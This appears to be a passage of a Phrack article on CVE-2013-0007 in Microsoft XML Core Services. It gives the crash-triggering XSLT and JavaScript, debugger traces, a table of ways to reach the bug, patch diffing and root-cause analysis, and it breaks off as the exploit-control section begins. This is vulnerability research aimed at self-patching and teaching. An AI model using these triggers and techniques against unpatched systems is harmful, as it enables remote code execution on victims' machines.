@@ -1,0 +1,2044 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0f, Issue 0x45, Phile #0x0a of 0x10
+
+|=----------------------------------------------------------------------=|
+|=---------------=[      The Art of Exploitation      ]=----------------=|
+|=----------------------------------------------------------------------=|
+|=--=[ Self-patching Microsoft XML with misalignments and factorials ]=-=|
+|=----------------------------------------------------------------------=|
+|=------------------------=[ by Alisa Esage ]=--------------------------=|
+|=-------------------------=[ hey@alisa.sh ]=---------------------------=|
+|=----------------------------------------------------------------------=|
+
+                              "Maybe it says something about human nature,
+                         that the only form of life we have created so far
+                                                   is purely destructive."
+                                   --  Stephen Hawking on computer viruses
+
+
+                              "I've tried to imagine what it would be like
+             to be a newcomer [in vulnerability research] in current times
+                                             and it's a bit depressing..."
+                                               -- Aaron Portnoy for PHRACK
+
+
+
+
+In this article a vulnerable Microsoft XML module is directed into
+invulnerable behavior by self-serving a two-byte inline memory patch
+through an arbitrary code execution opportunity.
+
+
+--[ Table of contents
+
+  1 - Introduction
+
+  2 - The vulnerability
+    2.1 - The trigger
+    2.2 - The impact vectors
+    2.3 - Analyzing the crash
+    2.4 - Estimating exploitability
+    2.5 - Patch analysis and the root cause
+
+  3 - The control
+    3.1 - Inflating the stack 1: XSLT recursion
+    3.2 - Inflating the stack 2: JavaScript recursion
+    3.4 - Filling the memory 1: images
+    3.5 - Filling the memory 2: integers
+    3.6 - Recursion control
+    3.7 - Program counter control
+
+  4 - The self-patch
+    4.1 - A leak without a leak
+    4.2 - The offset-to-value translation
+
+  5 - Further work
+
+  6 - Conclusion
+
+  7 - Thanks
+
+  8 - References
+
+  9 - Code
+
+
+--[ 1 - Introduction
+
+As a 'new school' binary vulnerability researcher, I've found it somewhat
+challenging to learn the subject in the times when it's become highly
+commercialized, which pushed the detailed technical security advisories
+and technical analyses of regular vulnerabilities out of the public
+access. While this article presents a funny research in the first place,
+it was as well composed with beginner fellows in mind: aiming to
+summarize the various foundational skills, techniques, and thinking
+patterns required to analyze and control a modern and mundane, yet a
+somewhat off-beat binary vulnerability. Besides revisiting the
+foundation, the article introduces a few pieces of novel information,
+such as Microsoft XML Core Services internals and some observations on
+heap spraying and stack manipulations with the latest Internet Explorer.
+
+The article covers a comprehensive deep technical analysis and control of
+the remote code execution vulnerability in Microsoft XML Core Services,
+CVE-2013-0007, for the purpose of self-patching. All the research and
+proof-of-concept prototyping were done with a deliberately synthetic
+platform, based on x86 Windows 7 with IE11 (which didn't even exist in
+the time of the vulnerability discovery), with all the updates installed
+but the one specific patch, and with the full page heap setting enabled
+for the target process.
+
+Although the vulnerability is two years old, the research is totally
+relevant to the modern situation. The author is not aware of any public
+or private exploits, as well as technical analyses for the described
+vulnerability, which is actually quite interesting and unique. Regarding
+the vulnerable software, remote code execution bugs in Microsoft XML Core
+Services are not rare, if not under-represented in public sources, as one
+was discovered by the low-skilled author herself in late 2014
+(CVE-2014-4118). Vulnerabilities in Microsoft XML may be highly critical
+because they allow not only for a drive-by exploitation of the Internet
+Explorer, but also, for multiple impact vectors beyond the browser.
+
+The code provided in this article is totally unreliable, guaranteed by the
+highly entropic nature of the vulnerability that causes the minimum 25%
+probability of an uncontrollable crash, as well as by superficial coding
+and testing choices. In addition, the statements concerning undocumented
+Windows internals were heavily based on debugging observations on a
+couple of testing systems, and should be verified with reverse
+engineering.
+
+
+--[ 2 - The vulnerability
+
+The vulnerability in question is a critical remote code execution bug in
+Microsoft XML Core Services, relevant to every edition of the Windows
+operating systems existing at the time of the discovery, according to the
+original security bulletin. It was patched in early 2013 with the
+Microsoft Security Bulletin MS13-002 [1] and the update KB2757638 (on x86
+Windows 7), that was later superseded with KB2939576.
+
+Although the bug can be reproduced with the four major versions of the
+MSXML module (3, 4, 5, 6) that may co-exist and even execute side by side
+on the target system, only version 6 is invoked by default on modern
+systems.
+
+Version 3 is still present on default installations of Windows 7 and 8.1
+for backward compatibility, contained within the module msxml3.dll, and
+may be invoked in the same script with version 6 by explicitly creating
+the "MSXML2.DOMDOCUMENT.3.0" ActiveXObject. Version 5 was shipped with
+Microsoft Office up to version 2007, and version 4 may be present on the
+system with 3rd party software as part of the obsolete MSO SDK.
+Additionally, some fuzzing efforts allowed us to deduce that versions 4,
+5 and 6 are largely based on a shared code base, while version 3 has a
+distinctively different code with version-specific bugs.
+
+As the most actual version 6 is contained in the module msxml6.dll, all
+further references to Microsoft XML internals will refer to the module
+msxml6.dll of version 6.30.7600.16385.
+
+
+--[ 2.1 - The trigger
+
+The original crash inducing code published [2] without much details by the
+researcher was a piece of XSLT code:
+
+
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+version="1.0">
+
+      <xsl:template name="main_template" match="/">
+              <xsl:for-each select="*">
+                      <xsl:apply-templates/>
+              </xsl:for-each>
+      </xsl:template>
+
+      <xsl:template name="xxx_nonexistent" match="//xxx[position()]" />
+
+</xsl:stylesheet>
+
+
+XSLT is the standard extension to XML which serves to perform analysis and
+transformation of the given XML data according to the given rules, and is
+itself implemented in XML. This brings up the idea that the bug can
+possibly be triggered via any application that uses the XSL
+transformation functionality of the Microsoft XML Core Services.
+
+
+--[ 2.2 - The impact vectors
+
+After doing some research on the XSL transformation functionality in
+various Windows software, I've come up with the following draft table of
+theoretically possible impact vectors and tested some of them:
+
+
+*------------------------------------------------------------------------*
+|# | Target app        | Technique             | Testing comments        |
+|--+-------------------+-----------------------+-------------------------|
+|1 | cscript           | Call to MSXML ActiveX |                         |
+|  |                   | method transformNode()| Crash (Windows 7)       |
+|--+-------------------+-----------------------+-------------------------|
+|2 | Internet Explorer | Call to MSXML ActiveX |                         |
+|  |                   | method transformNode()| Crash                   |
+|  |                   |                       | (Windows 7 + IE9/IE11)  |
+|--+-------------------+-----------------------+-------------------------|
+|3 | DotNetNuke        | Unknown               | From the original       |
+|  |                   |                       | publication, not tested |
+|--+-------------------+-----------------------+-------------------------|
+|4 | SharePoint        | Unknown               | From the original       |
+|  |                   |                       | publication, not tested |
+|--+-------------------+-----------------------+-------------------------|
+|5 | Microsoft Word    | Call to MSXML ActiveX |                         |
+|  |                   | via a macro           | Crash (Office 2010)     |
+|--+-------------------+-----------------------+-------------------------|
+|6 | Microsoft Word    | Native XML-XSL        |                         |
+|  |                   | transformation via an |                         |
+|  |                   | XSD scheme            | May be possible if      |
+|  |                   |                       | relies upon MSXML*1,    |
+|  |                   |                       | not tested              |
+|--+-------------------+-----------------------+-------------------------|
+|7 | Microsoft Word    | Call to MSXML ActiveX |                         |
+|  |                   | method transformNode()|                         |
+|  |                   | via an embedded       |                         |
+|  |                   | JavaScript in a       | Crash (Office 2007)     |
+|  |                   | Microsoft ActiveX     |                         |
+|  |                   | control               |                         |
+|--+-------------------+-----------------------+-------------------------|
+|8 | Microsoft Word    | Call to the directly  |                         |
+|  |                   | embedded ActiveX      | Not possible*2          |
+|--+-------------------+-----------------------+-------------------------|
+|9 | Microsoft Project | Native XML-XSL        |                         |
+|  |                   | transformation        | May be possible*3,      |
+|  |                   |                       | not tested              |
+|--+-------------------+-----------------------+-------------------------|
+|* | Arbitrary app*4   | Call to MSXML ActiveX |                         |
+|  |                   | method transformNode()| Definitely possible,    |
+|  |                   |                       | not tested              |
+*------------------------------------------------------------------------*
+
+*1 Applying an XSLT Transform [Word 2003 XML Reference]
+   http://msdn.microsoft.com/en-us/library/office/
+   ee364545(v=office.11).aspx
+
+*2 OOXML does not implement the functionality to call ActiveX methods,
+   although it can instantiate them:
+
+   [MS-OE376]: Office Implementation Information for ECMA-376 Standards
+   Support
+   http://msdn.microsoft.com/en-us/library/ff533853(v=office.12).aspx
+
+*3 How to: Use XSLT Transformations with Project XML Data Interchange
+   Files
+   http://msdn.microsoft.com/en-us/library/office/
+   bb968529(v=office.12).aspx
+
+*4 ...which uses MSXML's COM/ActiveX module
+
+
+The above table of possible impact vectors is far from being exhaustive.
+Most obviously, it should include at least the other Microsoft Office
+applications, in addition to Word and Project.
+
+
+--[ 2.3 - Analyzing the crash
+
+One of the ways to trigger the XSL transformation functionality of
+Microsoft XML Core Services is to call the transformNode() method from
+the COM/ActiveX object MSXML2.DOMDocument.6.0 via e.g. JavaScript:
+
+
+  xslcontent='<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/
+  Transform"
+  version="1.0"><xsl:template name="main_template" match="/"><xsl:for-each
+  select="*"><xsl:apply-templates/></xsl:for-each></xsl:template><
+  xsl:template
+  name="xx" match="x[position()]" /></xsl:stylesheet>';
+
+  srcTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
+  xsltTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
+  xsltTree.loadXML(xslcontent);
+  alert("crash");
+  srcTree.transformNode(xsltTree);
+
+
+The above code, when executed either with the help of cscript command line
+utility or from within an Internet Explorer web page, will produce a
+crash due to an invalid memory read attempt, similar to the following:
+
+
+  (5f8.9d4): Access violation - code c0000005 (first chance)
+  First chance exceptions are reported before any exception handling.
+  This exception may be expected and handled.
+  eax=ad9004d6 ebx=0e419ff0 ecx=0e419f42 edx=6f6e4430
+  esi=0e419f40 edi=04d6ac70 eip=6f6f9c85 esp=04d6ac6c
+  ebp=04d6ad88 iopl=0         nv up ei pl nz na pe nc
+  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000 efl=00010206
+  msxml6!XEngine::stns+0x6:
+  6f6f9c85 8b5008        mov     edx,dword ptr [eax+8]
+  ds:0023:ad9004de=????????
+
+
+An observation can be made across multiple tests that the crashing memory
+address varies a little bit from test to test, but always falls into a
+somewhat persistent address range in the kernel memory, which actually
+causes the access violation.
+
+Looking at the stack dump we can surmise that the crash occurs during the
+processing of a particular XSLT instruction, represented by the function
+XEngine::stns(), by the MSXML's XEngine' virtual machine:
+
+
+  0:007> k
+  ChildEBP RetAddr
+  04d6ac68 6f6e60cc msxml6!XEngine::stns+0x6
+  04d6ad88 6f6e60cc msxml6!XEngine::frame+0x84
+  04d6ae08 6f6f3e2d msxml6!XEngine::frame+0x84
+  04d6aeb8 6f75ffb0 msxml6!XEngine::execute+0x1b4
+  04d6af14 6f75fee3 msxml6!XUtility::executeXCode+0x90
+  04d6af68 6f75fe2b msxml6!XUtility::transformNode+0x4a
+  04d6afd4 6f75fda2 msxml6!DOMNode::transformNode+0xa6
+  04d6afe8 6f7460c9 msxml6!DOMDocumentWrapper::transformNode+0x17
+  04d6b004 6f760b71 msxml6!DOMNode::_invokeDOMNode+0x30e
+  ...
+
+
+Indeed, further analysis reveals a virtual machine execution loop, in
+which the function XEngine::frame() is responsible for the execution of
+the current fragment of 'XCode'. XCode is essentially a dynamically
+constructed sequence of pointers to member functions of the XEngine class
+along with their arguments, that was compiled from the input XSLT markup:
+
+
+  0:007> u msxml6!XEngine::frame l30
+  msxml6!XEngine::frame:
+  ...
+  6f6e6092 call    msxml6!XEngineFrame::initFrame (6f6e72c3)
+  ...
+  ; increment the pointer to the chain of XEngine functions:
+  6f6e60b8 add     dword ptr [esi+0A0h],10h
+  ; loop:
+  6f6e60bf mov     eax,dword ptr [esi+0A0h];retrieve the next XEngine proc
+  6f6e60c5 mov     ecx,dword ptr [eax+4] ; retrieve the argument
+  6f6e60c8 add     ecx,esi ; increment the pointer to a global structure
+  6f6e60ca call    dword ptr [eax] ; call the XEngine proc
+  6f6e60cc add     dword ptr [esi+0A0h],eax
+  6f6e60d2 je      msxml6!XEngine::frame+0x95 (6f6e60dd)
+  6f6e60d4 cmp     byte ptr [esi+0B8h],0
+  6f6e60db je      msxml6!XEngine::frame+0x77 (6f6e60bf) ; loop
+
+
+The XCode which corresponds to the vulnerable XSLT code may be observed by
+dumping of the current XEngine frame, which reveals the list of pointers
+to functions to be called sequentially, as well as their arguments:
+
+
+  0:007> p
+  eax=06ca9ff4 ebx=06ca9ff0 ecx=0513b010 edx=0513b0a0 esi=06ca9f40
+  edi=0513b010 eip=6f6e60bf esp=0513b010 ebp=0513b088 iopl=0
+  nv up ei pl nz na pe nc
+  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000
+  efl=00000206
+
+  msxml6!XEngine::frame+0x77:
+  6f6e60bf mov     eax,dword ptr [esi+0A0h] ds:0023:06ca9fe0=6cf0c806
+
+  0:007> dds poi(esi+a0)
+  06c8f05c  6f6e6046 msxml6!XEngine::frame
+  06c8f060  00000000
+  06c8f064  00000030
+  06c8f068  c0c0c000
+  06c8f06c  6f6f9bba msxml6!XEngine::ldc_i
+  06c8f070  00000000
+  06c8f074  00000000
+  06c8f078  6f6f16e8 msxml6!XEngine::br
+  06c8f07c  00000000
+  06c8f080  00000128
+  06c8f084  6f6e6046 msxml6!XEngine::frame
+  06c8f088  00000000
+  06c8f08c  000000d0
+  06c8f090  c0c0c000
+  06c8f094  6f6e7868 msxml6!XEngine::ctxt
+  06c8f098  00000000
+  06c8f09c  0000000c
+  06c8f0a0  6f6e7399 msxml6!XEngine::ch
+  06c8f0a4  00000000
+  06c8f0a8  00000024
+  06c8f0ac  06c8bde4
+  06c8f0b0  6f6f16e8 msxml6!XEngine::br
+  06c8f0b4  00000000
+  06c8f0b8  0000000c
+  06c8f0bc  6f6f9c7f msxml6!XEngine::stns
+  06c8f0c0  00000002
+  06c8f0c4  6f6fcf32 msxml6!XEngine::locldns
+  06c8f0c8  00000000
+  06c8f0cc  00000050
+  06c8f0d0  6f6fa250 msxml6!XEngine::brns
+  06c8f0d4  00000000
+  06c8f0d8  0000009c
+  ...
+
+
+Each function of the XEngine class works with an undocumented global s
+structure, referenced by the registers esi or ecx within the class code.
+The structure holds pointers to MSXML's virtual address tables, stack
+pointers and some other values:
+
+
+  0:007> dds esi l40
+  06ca9f40  6f6c1754 msxml6!SXPQCompiler::`vftable'
+  06ca9f44  6f6e75d8 msxml6!XEngine::`vftable'
+  06ca9f48  00000008
+  06ca9f4c  6f6e75c8 msxml6!XEngine::CurrentExprEval::`vftable'
+  06ca9f50  6f6e75d0 msxml6!XEngine::GlobalExprEval::`vftable'
+  06ca9f54  06ca9f40
+  06ca9f58  06ca9f78
+  06ca9f5c  06c8bda8
+  06ca9f60  00000000
+  06ca9f64  00000000
+  06ca9f68  00000000
+  06ca9f6c  00000000
+  06ca9f70  00000000
+  06ca9f74  00000000
+  06ca9f78  6f6e7620 msxml6!XRuntime::`vftable'
+  ...
+
+
+In the vulnerable code, the pointer to the structure is being incremented
+in the XEngine loop, within the XEngine::frame() function, by the value
+provided in the XCode frame:
+
+
+  ; loop:
+  6f6e60bf mov     eax,dword ptr [esi+0A0h];retrieve the next XEngine proc
+  6f6e60c5 mov     ecx,dword ptr [eax+4] ; retrieve the argument
+  6f6e60c8 add     ecx,esi ; increment the pointer to the global structure
+
+
+The reason of the crash is that, immediately before entering the
+XEngine::stns() function, the pointer to the global structure is
+incremented by the invalid value of 2:
+
+
+  msxml6!XEngine::frame+0x82:
+  6f6e60ca call    dword ptr [eax];ds:0023:0d5af0bc={msxml6!XEngine::stns}
+
+  0:007> u eip-10
+  msxml6!XEngine::frame+0x72:
+  ...
+  6f6e60bf mov     eax,dword ptr [esi+0A0h]
+  6f6e60c5 mov     ecx,dword ptr [eax+4]
+  6f6e60c8 add     ecx,esi
+  6f6e60ca call    dword ptr [eax]
+
+  0:007> dds poi(esi+a0)
+  06c8f0bc  6f6f9c7f msxml6!XEngine::stns
+  06c8f0c0  00000002
+
+
+Next, when the improperly incremented pointer is dereferenced in
+XEngine::stns(), it leads to the misaligned memory access and invalid
+values being retrieved, causing the crash:
+
+
+  msxml6!XEngine::stns+0x6:
+  6f6f9c85 mov     edx,dword ptr [eax+8] ds:0023:b010051b=????????
+
+  ; where did eax come from?
+  0:007> u eip-6
+  msxml6!XEngine::stns:
+  ; should point to the global structure
+  6f6f9c7f mov     eax,dword ptr [ecx+0B0h]
+  6f6f9c85 mov     edx,dword ptr [eax+8]
+  ...
+  0:007> dds ecx
+  ; looks like total garbage, but it's actually due to the misalignment...
+  06ca9f42  75d86f6c shell32!__dyn_tls_init_callback (shell32+0x5f6f6c)
+  06ca9f46  00086f6e
+  06ca9f4a  75c80000 shell32!__dyn_tls_init_callback (shell32+0x4f0000)
+  06ca9f4e  75d06f6e shell32!__dyn_tls_init_callback (shell32+0x576f6e)
+  06ca9f52  9f406f6e
+  ...
+  ; ...and the correctly aligned structure is actually 2 bytes higher:
+  0:007> dds ecx-2
+  06ca9f40  6f6c1754 msxml6!SXPQCompiler::`vftable'
+  06ca9f44  6f6e75d8 msxml6!XEngine::`vftable'
+  06ca9f48  00000008
+  06ca9f4c  6f6e75c8 msxml6!XEngine::CurrentExprEval::`vftable'
+  06ca9f50  6f6e75d0 msxml6!XEngine::GlobalExprEval::`vftable'
+  06ca9f54  06ca9f40
+  06ca9f58  06ca9f78
+  06ca9f5c  06c8bda8
+  06ca9f60  00000000
+  ...
+
+
+At this point the vulnerability does not look very promising: the crashing
+memory address being read from a valid pointer to internal program data,
+shifted by strictly two bytes.
+
+
+--[ 2.4 - Estimating exploitability
+
+Let's observe the vulnerable XCode frame once again:
+
+
+  0:007> dds poi(esi+a0)
+  06c8f05c  6f6e6046 msxml6!XEngine::frame
+  06c8f060  00000000
+  06c8f064  00000030
+  06c8f068  c0c0c000
+  06c8f06c  6f6f9bba msxml6!XEngine::ldc_i
+  06c8f070  00000000
+  06c8f074  00000000
+  06c8f078  6f6f16e8 msxml6!XEngine::br
+  06c8f07c  00000000
+  06c8f080  00000128
+  06c8f084  6f6e6046 msxml6!XEngine::frame
+  06c8f088  00000000
+  06c8f08c  000000d0
+  06c8f090  c0c0c000
+  06c8f094  6f6e7868 msxml6!XEngine::ctxt
+  06c8f098  00000000
+  06c8f09c  0000000c
+  06c8f0a0  6f6e7399 msxml6!XEngine::ch
+  06c8f0a4  00000000
+  06c8f0a8  00000024
+  06c8f0ac  06c8bde4
+  06c8f0b0  6f6f16e8 msxml6!XEngine::br
+  06c8f0b4  00000000
+  06c8f0b8  0000000c
+  06c8f0bc  6f6f9c7f msxml6!XEngine::stns
+  06c8f0c0  00000002
+  06c8f0c4  6f6fcf32 msxml6!XEngine::locldns
+  06c8f0c8  00000000
+  06c8f0cc  00000050
+  06c8f0d0  6f6fa250 msxml6!XEngine::brns
+  06c8f0d4  00000000
+
+
+We can see that, at some point after the execution of the XEngine::stns()
+function, the XEngine::brns() function will be called, that contains a
+dynamic call:
+
+
+  msxml6!XEngine::brns:
+  712da250 mov     edi,edi
+  712da252 push    esi
+  712da253 mov     esi,ecx
+  712da255 mov     ecx,dword ptr [esi+0A4h]
+  712da25b mov     eax,dword ptr [ecx]  ; {msxml6!ChildNodeSet::`vftable'}
+  712da25d call    dword ptr [eax] ; dynamic call
+
+
+The dynamic call address in XEngine::brns() derives from the same place in
+memory where XEngine::stns() wrote something:
+
+
+  msxml6!XEngine::stns:
+  6f6f9c7f mov     eax,dword ptr [ecx+0B0h]
+  6f6f9c85 mov     edx,dword ptr [eax+8]
+  6f6f9c88 push    esi
+  6f6f9c89 lea     esi,[edx+0Ch]
+  6f6f9c8c mov     dword ptr [eax+8],esi
+  6f6f9c8f mov     eax,dword ptr [edx+4]
+  6f6f9c92 push    8
+  6f6f9c94 mov     dword ptr [ecx+0A4h],eax ; wrote something
+  6f6f9c9a pop     eax
+  6f6f9c9b pop     esi
+  6f6f9c9c ret
+
+
+More precisely, the written value derives from the crashing memory
+address:
+
+
+  msxml6!XEngine::stns:
+  6f6f9c7f mov     eax,dword ptr [ecx+0B0h]
+  6f6f9c85 mov     edx,dword ptr [eax+8] ; read (crashes here)
+  6f6f9c88 push    esi
+  6f6f9c89 lea     esi,[edx+0Ch]
+  6f6f9c8c mov     dword ptr [eax+8],esi
+  6f6f9c8f mov     eax,dword ptr [edx+4] ; read
+  6f6f9c92 push    8
+  6f6f9c94 mov     dword ptr [ecx+0A4h],eax ; write
+  6f6f9c9a pop     eax
+  6f6f9c9b pop     esi
+  6f6f9c9c ret
+
+
+Which means that, in the case that the crashing memory was readable, an
+address value would be read from that memory, to be call'ed later within
+XEngine::brns(). What happens here is probably some manipulations with the
+virtual address tables of the XEngine class.
+
+However in the vulnerable context, because the global pointer is only
+corrupted in stns() while being intact in brns(), only two upper bytes of
+the final memory destination will be overwritten:
+
+
+  ; read(+B0+2)=0c6f0027d, write(+A4+2)=0c79c027d, call(+A4)=027dc7b4:
+  0:005> dpp ecx-2 L30
+  ...
+        04388840  045ea780 711d31e8 msxml6!Vector::`vftable'
+        04388844  0438bab8 711d1754 msxml6!SXPQCompiler::`vftable'
+        04388848  04389484 71209c7f msxml6!XEngine::stns
+  +0A4h 0438884c  027dc7b4 711f44b8 msxml6!RTFNodeSet::`vftable'
+        04388850  027dc79c 711f44b8 msxml6!RTFNodeSet::`vftable'
+        04388854  045e02b0 711ddcf8 msxml6!Name::`vftable'
+  +0B0h 04388858  027dc5d0 027dc6f0
+        0438885c  027dc6f0 027dc770
+        04388860  00000000
+
+
+In other words, it might be possible to control at most the higher word
+of the pointer used to retrieve the dynamic call address.
+
+Next, because of the 2-bytes misaligned memory read in XEngine::stns(),
+the crashing address is essentially a composition of two valid stack
+pointers:
+
+
+  msxml6!XEngine::stns+0x6:
+  6f6f9c85 8b5008   mov  edx,dword ptr [eax+8] ds:0023:b040053a=????????
+
+  ; composed from the two valid stack pointers:
+  0:007> dds ecx+b0-2
+  0d5c9ff0  0532af20
+  0d5c9ff4  0532b040
+
+  ; both of them on the stack:
+  0:007> k
+  ChildEBP RetAddr
+  0532af18 6f6e60cc msxml6!XEngine::stns+0x6
+  0532b038 6f6e60cc msxml6!XEngine::frame+0x84
+  ; ...the pointers
+  0532b0b8 6f6f3e2d msxml6!XEngine::frame+0x84
+  0532b168 6f75ffb0 msxml6!XEngine::execute+0x1b4
+
+
+That is, the upper word of the crashing memory address is equal to the
+lower word of the stack address, located somewhere within the local
+variables frame of XEngine::frame(). Which means that, in this particular
+vulnerability context, the crashing memory address depends exclusively on
+the stack layout.
+
+Next, it was mentioned in the original publication that slightly different
+crashes could be observed by modifying the vulnerable XSLT code. Indeed,
+the following XSLT code would cause a 6-bytes misaligned memory access in
+XEngine::stns():
+
+
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+version="1.0">
+
+      <xsl:template name="main_template" match="/">
+              <xsl:for-each select="*">
+                      <xsl:apply-templates/>
+              </xsl:for-each>
+      </xsl:template>
+
+      <xsl:template name="xxx_nonexistent"
+      match="//xxx[position()=last()]" />
+
+</xsl:stylesheet>
+
+
+However, a 6-bytes misaligned pointer crash is not possible to control,
+because it can only yield the null page read:
+
+
+  0:005> dpp ecx+6 L30
+  ...
+  042a8840  0480a760 715e31e8 msxml6!Vector::`vftable'
+  042a8844  042abab8 715e1754 msxml6!SXPQCompiler::`vftable'
+  042a8848  042a9484 71619c7f msxml6!XEngine::stns
+  042a884c  0269c684 716044b8 msxml6!RTFNodeSet::`vftable'
+  042a8850  0269c66c 716044b8 msxml6!RTFNodeSet::`vftable'
+  042a8854  048002b0 715edcf8 msxml6!Name::`vftable'
+  042a8858  0269c4a0 0269c5c0
+  042a885c  0269c5c0 0269c640
+  042a8860  00000000 ; it's always null
+  042a8864  00000000
+
+
+All in all, the vulnerability looks quite exploitable at this point.
+
+
+--[ 2.5 - Patch analysis and the root cause
+
+I decided to look at the exact root cause of the vulnerability in order
+to see if there might be any other ways to control it besides messing
+with the thread stack. May the pointer incrementing value be controlled?
+Or maybe, any opportunities to trigger the vulnerability with a
+completely different input XSLT code? Because the vulnerability is
+already patched, it's possible to leverage patch analysis for the root
+cause investigation.
+
+From binary diffing of the patch we can see that the crashing procedure
+XEngine::stns() was not even patched. Instead, the XEngine::frame()
+procedure was patched by completely removing the pointer incrementing
+code:
+
+
+*---------------------------------------------------*
+| Vulnerable code         | Patched code            |
+|-------------------------+-------------------------|
+| loc_726C60BF:           | loc_726C6BB6:           |
+| mov     eax, [esi+0A0h] | mov     eax, [esi+9Ch]  |
+| mov     ecx, [eax+4]    | mov     ecx, esi        |
+| add     ecx, esi        | -                       |
+| call    dword ptr [eax] | call    dword ptr [eax] |
+| add     [esi+0A0h], eax | add     [esi+9Ch], eax  |
+*---------------------------------------------------*
+
+
+But where exactly did the invalid incremental value originate from?
+
+Among few dozens of modified procedures in the patch, there is a bunch of
+XCodeGen class functions, all of them initializing the XCode frame:
+
+
+  .text:72733631 ; public: void __thiscall XCodeGen::brns(unsigned char *)
+  .text:72733631 ?brns@XCodeGen@@QAEXPAE@Z proc near
+  .text:7273363A                 xor     esi, esi
+  .text:7273363C                 mov     edx, offset XEngine::brns(void)
+  .text:72733641                 mov     [eax+4], esi ; the argument
+  .text:72733644                 mov     [eax], edx ; the function address
+
+
+In the above code, two XCode frame slots are initialized: both the call
+pointer (set to the address of XEngine::brns() in this case) and the
+incremental value (set to zero). In fact, all functions of the XCodeGen
+class initialize the incremental value to zero. But then, in some cases
+the value becomes corrupted after the call to XCodeGen::ensureCapacity():
+
+
+  .text:726C6B93 ; public: void __thiscall XCodeGen::ch(class NavFilter *)
+  .text:726C6B93 ?ch@XCodeGen@@QAEXPAVNavFilter@@@Z proc near
+  .text:726C6B93
+  .text:726C6B93 arg_0           = dword ptr  8
+  .text:726C6B93
+  .text:726C6B93                 mov     edi, edi
+  .text:726C6B95                 push    ebp
+  .text:726C6B96                 mov     ebp, esp
+  .text:726C6B98                 push    ebx
+  .text:726C6B99                 push    esi
+  .text:726C6B9A                 push    edi
+  .text:726C6B9B                 push    10h
+  .text:726C6B9D                 mov     esi, ecx
+  .text:726C6B9F                 mov     edi, offset XEngine::ch(void)
+  .text:726C6BA4                 xor     ebx, ebx
+  .text:726C6BA6                 call    XCodeGen::ensureCapacity(uint)
+  .text:726C6BAB                 mov     [eax], edi
+  ; ebx *should* be zero unless ensureCapacity() messes with it:
+  .text:726C6BAD                 mov     [eax+4], ebx
+
+
+And the actual corruption takes place inside the
+ASTCodeGen::xpathFunctionCode() function, which sets some bits of the
+incremental value with either mask 2 or 4 (or possibly, both):
+
+
+  msxml6!ASTCodeGen::xpathFunctionCode+0x347:
+  720abf20 5e              pop  esi
+  720abf21 5b              pop  ebx
+  720abf22 5d              pop  ebp
+  720abf23 c20400          ret  4
+  720abf26 8b4604          mov  eax,dword ptr [esi+4]
+  720abf29 8b4018          mov  eax,dword ptr [eax+18h]
+  720abf2c 83481002        or   dword ptr [eax+10h],2
+  ...
+  msxml6!ASTCodeGen::xpathFunctionCode+0x12a:
+  720ef0f6 83481004        or   dword ptr [eax+10h],4
+  720ef0fa 8b4e04          mov  ecx,dword ptr [esi+4]
+  720ef0fd e80a000000      call msxml6!XCodeGen::last (720ef10c)
+  720ef102 e918cefbff      jmp  msxml6!ASTCodeGen::xpathFunctionCode+0x346
+
+
+There is a jump table, likely a case switch, that refers to both of the
+bit-setting code branches:
+
+
+  ; DATA XREF: ASTCodeGen::xpathFunctionCode(FunctionCallNode *)+31r
+  .text:72738022 off_72738022    dd offset loc_7271C27D
+  .text:72738022                 dd offset loc_7273731D
+  .text:72738022                 dd offset loc_7273CD36
+  .text:72738022                 dd offset loc_7273DB58
+  .text:72738022                 dd offset loc_727373BF
+  .text:72738022                 dd offset loc_726FD455
+  .text:72738022                 dd offset loc_726FDD0C
+  .text:72738022                 dd offset loc_72737FD8
+  .text:72738022                 dd offset loc_7271C388
+  .text:72738022                 dd offset loc_72737393
+  .text:72738022                 dd offset loc_7273F9A6
+  .text:72738022                 dd offset loc_72737FEF
+  .text:72738022                 dd offset loc_726F95D7
+  .text:72738022                 dd offset loc_727373BF
+  .text:72738022                 dd offset loc_727373BF
+  .text:72738022                 dd offset loc_727373C6
+  .text:72738022                 dd offset loc_726FF1C8
+  .text:72738022                 dd offset loc_7271C3D0
+  .text:72738022                 dd offset loc_727373BF
+  .text:72738022                 dd offset loc_726FAD0A
+  .text:72738022                 dd offset loc_7273E8DD
+  .text:72738022                 dd offset loc_726FAF60
+  .text:72738022                 dd offset loc_726FA10C
+  .text:72738022                 dd offset loc_726F9CCB
+  .text:72738022                 dd offset loc_726FCCEA
+
+
+By looking through other switch cases in the table we can confirm that
+none of them performs any other write operations with the memory location
+in question. Thus, the pointer incremental value can only be set to the
+three values: 2, 4, and 6 (2 OR 4), of which only the first case would be
+controllable.
+
+Next, because the actual corrupting code (the OR instruction) was not
+eliminated by the patch, but rather, the incrementing instruction was
+eliminated, we have to assume that there might be other code paths which
+rely upon corrupted values. But the likeliness of this is low beyond the
+scope of the XEngine class, of which the main function XEngine::frame()
+was already patched. So, I dropped this opportunity as not worthy of
+investigation.
+
+Another opportunity that must be considered is, if it might be possible to
+control the original values from which the crashing pointer was composed.
+But, in the debugging context it's clear that the values are just
+pointers to local variables and thus unlikely to be controlled directly:
+
+
+  msxml6!XEngine::stns+0x6:
+  6f6f9c85 8b5008    mov   edx,dword ptr [eax+8] ds:0023:b040053a=????????
+
+  0:007> dds ecx+b0-2
+  0d5c9ff0  0532af20
+  0d5c9ff4  0532b040
+
+  0:005> u eip-30 l30
+  msxml6!XEngine::execute+0xad:
+  ...
+  711c3d8c 8d45a4          lea     eax,[ebp-5Ch]
+  ...
+  711c3d8f 8983a4000000    mov     dword ptr [ebx+0A4h],eax
+
+
+As a side note, the patch analysis for this case would not have been
+possible without prior knowledge of the crash triggering input and the
+crash context, because the patched code is so far away from both the
+crashing code and the vulnerability root cause, while the volume of code
+modifications introduced by the patch is huge.
+
+
+--[ 3 - The control
+
+At this point it's clear that the only reasonable way to control the
+vulnerability is to inflate the stack so that the crashing pointer would
+fall into userland memory area that can possibly be controlled:
+
+
+  msxml6!XEngine::stns+0x6:
+  6f6f9c85 8b5008    mov   edx,dword ptr [eax+8] ds:0023:b040053a=????????
+
+  0:007> u eip-6
